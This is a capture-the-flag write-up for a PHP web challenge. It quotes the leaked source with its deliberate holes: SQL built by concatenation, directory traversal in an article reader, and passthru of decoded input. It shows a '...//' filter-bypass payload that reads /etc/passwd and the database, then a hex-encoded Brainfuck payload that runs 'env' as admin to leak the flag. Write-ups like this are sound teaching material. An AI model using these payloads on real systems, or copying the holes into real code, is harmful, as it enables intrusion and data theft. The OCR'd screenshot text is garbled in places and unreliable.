# spice
> Try /spice.php

> engineer1337 : engineer1337

> wait 5 sec, after start (long boot process)

## About the Challenge
We were given a website, and if we access the `/spice.php` endpoint the website will leak the source code

```php
<?php
require __DIR__ . '/vendor/autoload.php';
use \Firebase\JWT\JWT;
use Firebase\JWT\Key;
use \dotzero\Brainfuck;
include_once 'getSecret.php';
include_once 'db.php';

    if (isset($_GET['username']) && isset($_GET['password'])){

        $db = getDb();
        $user = filter_var($_GET['username'], FILTER_SANITIZE_SPECIAL_CHARS);

        $statement = $db->prepare("SELECT password FROM users WHERE username='" . $user . "'");
        $result = $statement->execute();
        
        while ($row = $result->fetchArray(SQLITE3_ASSOC)) {
            $pass  = reset($row);
        }

        if ($pass === $_GET['password']){
            $key = getSecret();
            $payload = ['user' => $user ];
            $jwt = JWT::encode($payload, $key, 'HS256');
            setcookie('jwt', $jwt);
            echo $jwt;
        } else {
            echo "Bad creditionals";
        }
    }
    else{
        if (isset($_GET['bf_base16'])){
        $swag = 123; 
        } else {
           $source = show_source("spice.php", true);
           echo $source;
                
    }
    }
    
    if (isset($_COOKIE['jwt'])){
        if (isset($_GET['bf_base16'])){
        $key = getSecret();
        $decodeJwt = JWT::decode($_COOKIE['jwt'], new Key($key, 'HS256'));
        $decodeJwt = (array) $decodeJwt;
        $user = $decodeJwt['user'];
        if ($user === 'admin'){
            $base_code = $_GET['bf_base16'];
            $code = hex2bin($base_code);

            $bf = new Brainfuck($code);
            $output = $bf->run(true);

            passthru($output); ///It's a joke !
        }
        die();
        }

        $key = getSecret();
        $decodeJwt = JWT::decode($_COOKIE['jwt'], new Key($key, 'HS256'));
        $decodeJwt = (array) $decodeJwt;
        $user = $decodeJwt['user'];
        if ( $user === 'engineer1337'){
            echo "Enter the title of the article to read it ";
            if(isset($_GET['article'])){
                $string = $_GET['article'];
                $article = str_replace("./", '', $string);
                if (!file_exists($article)){
                    echo "<h1>The article does not exist!</h1>";
                } else {
                    echo "Article: " . file_get_contents($article) ;
                }
            }
        } 
    }
?>
```

## How to Solve?
If we check on the source code, we can input a password and username using GET method. We use `engineer1337` as a password and username. So the request will be like this


[Image extracted text: Not secure
b2ce4777-2a18-434d-b604-05d5c1e6b207node omwars org/spice php?username-engineer1337&password-engineer1337
eyJOeXAiOiJKVIQiLCJhbGciOiJIUzIINiJ9.eyJlc2VyljoiZWSnaWSLZXIx MzM3InO.tTNdDatuSiAJSSNYwtY-FvabOoblQOCCgQSnQxa-YAQEnter the title of the article to read it]


After login, we need to add `article` parameter. And there is a `Directory Traversal` vulnerability because there is `file_get_contents` function

```php
if(isset($_GET['article'])){
    $string = $_GET['article'];
    $article = str_replace("./", '', $string);
    if (!file_exists($article)){
        echo "<h1>The article does not exist!</h1>";
    } else {
        echo "Article: " . file_get_contents($article) ;
    }
}
```

But there is a filter, if we input `./` the code will replace it with blank. So to bypass the filter, we can append the payload. The usual payload is `../../../../etc/passwd` and we can bypass that using `...//...//...//...//etc/passwd`


[Image extracted text: 7
C
Not secure
b2ce4777-2a18-434d-b604-05d5c1e6b207.node omwars org/spice php?username-engineer1337&password-engineer1337&article=
JIJI=
JIJIJIJI-I-Iletc_ _
eyJOeXAiOiJKV QiLCJhbGciOiJIUzIINiJ9.eyJlc2VyljoiZWSnaWSIZXIx VzM3InO.tZNdDatuSiAJSSNYwtY-Fva6OoblQOCCgQSnQxa-YAQEnter the title of the article to read it Article: root:x:
bin:x:I:l:bin:/bin:/sbin nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm: var/adm:/sbin/nologin lpx:4:7:lp: var/spoolIpd: Isbin/nologin sync:x:5:O:sync:/sbin:/bin/sync shutdown:
halt:x:7:O.halt: /sbin: /sbin/halt mail:x:8:12:mail: var/mail:/sbin/nologin news:x:9:13:news: usr/lib/news:/sbin nologin Uucp:x:lO:14.uucp: var/spool uucppublic:/sbin/nologin operatorx:Il:O:operat
man:x:13 :man: usr/man:/sbin
Vnologin postmaster:x: 14:12:postmaster: var/mail:/sbin nologin cron:x:[6:l6:cron: var/spoolcron:/sbin nologin ftp:x:2l:2 : var/lib ftp:/sbin nologin sshd.x:22.22:
at:x:25.25.at: var/spool cron atjobs:/sbin/nologin squid:x:31:31:Squid: var/cache/squid:/sbin nologin xfs:x:33.33.X Font Server:Yetc XII fs:/sbin nologin games:x:35.35:games: usr/games: /sbin no
cyrus:x:85.12: UST cyrus:/sbin nologin vpopmail:x:89.89:: var vpopmail:/sbin/nologin ntp:x:123:123.NTP: var/empty:/sbin nologin smmsp:x:209.209.smmsp: var/spool mqueue: /sbin/nologin
guest:x:405:10:guest:/dev/null:/sbin/nologin nobodyx:65534.65534:nobody:/:Isbin nologin WWW-data:x:82:82.Linux User,_ /home WWW-data: /sbin nologin utmpx:100:406:utmp:/home utmp:/b
nginxx:LO1:10:nginx: var lib/nginx:/sbin/nologin]


If we check the `spice.php` source code. There is an interesting file, `db.php` and `getSecret.php` (We will ignore getSecret.php because that file just a rabbit hole). If we check the content of `db.php` we will get another interesting file


[Image extracted text: C
Not secure
view-source b2ce4777-2a18-434d-b604-05d5c1e6b207 nodeomwars org/spice php?username-engineer1337&password-engineer1337&article=_
JIJIJIIII
rap
yJOeXAioiJKViQiLCJhbGciOiJIUzIlNiJ9.eyJlcZVyIjoiZWSnaNSIZXIxMzM3Ine.tZNdDatuSiAJSSNYwtY-Fva6ooblqaccgQSnQxa-yAQEnter
the
title of
the
article to
read
it
Article:
<?php
function
Sdb
new
SQLite3("vuln-php
SQLITE3_OPEN_READWRITE) ;
return
Sdb;
getDb(]


There is a SQLite database file, if we check the content of the file by accessing `/spice.php?username=engineer1337&password=engineer1337&article=...//...//...//...//...//...//...//...//...//var/www/html/vuln-php.db` we will get administrator username and password


[Image extracted text: 34d-b604-05d5c1e6b207node omwars org/spice php?username-engineer1337&password-engineer1337&article=_
PEEE++EYtablesqlite_sequencesqlite_sequenceECREATE
TABLE
sglite_sequence(name
seq)@
@EEEEEEqtableusersuser
22@ %%engineerl337engineer1337220
@SadminjES28Y9EZStgyAao8V8C
@22]


Now, use the admin credential as username and password.


[Image extracted text: 6 7
C
Not secure
b2ce4777-2a18-434d-b604-05d5c1e6b207.node omwarsorg/spice php?username-
admin&password-jES28Y9EZStgyAao8V8C
eyJOeXAiOiJKV QiLCJhbGciOiJIUzIINiJ9.eyJlc2VyljoiYWRta W4ifQ.363.Mzml67-SSOaLSYOSKOONjID9sHYGrXps79s4O1Q]


Because we now login as administrator, we can execute an OS command using `bf_base16` parameter. Why? Check the code below, because we already login as administrator, we can execute OS command using `passthru` PHP function

```php
if ($user === 'admin'){
    $base_code = $_GET['bf_base16'];
    $code = hex2bin($base_code);

    $bf = new Brainfuck($code);
    $output = $bf->run(true);

    passthru($output); ///It's a joke !
}
```

Because the code using `Brainfuck()` and `hex2bin()`. We need to wrap our payload using brainfuck first and then encode it using hex.

For example I want to run `env` command. The brainfuck will look like this
```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+.+++++++++.++++++++.
```

And then change it to hex
```
2b2b2b2b2b2b2b2b2b2b5b3e2b3e2b2b2b3e2b2b2b2b2b2b2b3e2b2b2b2b2b2b2b2b2b2b3c3c3c3c2d5d3e3e3e3e2b2e2b2b2b2b2b2b2b2b2b2e2b2b2b2b2b2b2b2b2e
```

Send the payload to the server using `bf_base16` parameter and you will get the flag because the flag was located on environment var


[Image extracted text: 7
C
Not secure
b2ce4777-2a18-434d-b604-05d5c1e6b207.nodeomwars org/spice php?username-admin&password-jES28Y9EZStgyAaoxv8c&bf_base16-2b2
eyJOeXAiOiJKV QiLCJhbGcOiJIUzIINiJ9.eyJlc2VyljoiYWRta W4ifQ.363.Mzml67-SSOaLSYOSKOONjID9ZsHYGrXps79s-OlQPHP_
EXTRA CONFIGURE
ARGS=
group-WWW-data ~~disable-cgi USER-nginx SUPERVISOR_GROUP_NAME-php-fpm HOSTNAME-2bs9blc63elc PHP_INI_DIR- usr/localetc php SHLVL=2 HOME
PHP_CFLAGS--fstack-protector-strong -fpic -fpie -02 -D_LARGEFILE_SOURCE -D_FILE
OFFSET
BITS-64 PHP  VERSION=7.44.15 COMPOSER HOME= usrllo
GPG_KEYS-42670A 7FE4DO44ICSE4632349E4FDCO74A4EFOZD SAS2SS078IFZSS60SBFSISFC9]ODEB46FS3EA312 PHP_ASC_URL-https:/ WWWphp net distribut_
strong -fpic -fpie -02 -D_LARGEFILE_SOURCE -D_FILE_OFFSET
BITS-64 PHP_URL-https:
WWWV
php net/distributions php-7.4.15.tarxz
PATH-J usr/local/sbin: uSt/local bin: uSr/sbin: usr bin:/sbin:/bin:/usr/local composer bin: usr/local/composer vendor bin LD_PRELOAD- usr/lib preloadable_libiconv.so phy
SUPERVISOR_SERVER_
URL-unix:// dev/shmn/supervisor sock SUPERVISOR_
PROCESS
NAME-php-fpm PWD-Ivar www/html PHPIZE_DEPS-autoconf dpkg-dev
PHP_SHA256-96859c65f0cf7b3eff9d4a28cfab719563d36a1db3c20d874a79652c44d43cb8 FLAG-OmWars {fcd9ead7-575c-4d3f-6277-a8da7c509a97}]


```
OmWars{fcd9ead7-575c-4d3f-b277-a8da7c509a97}
```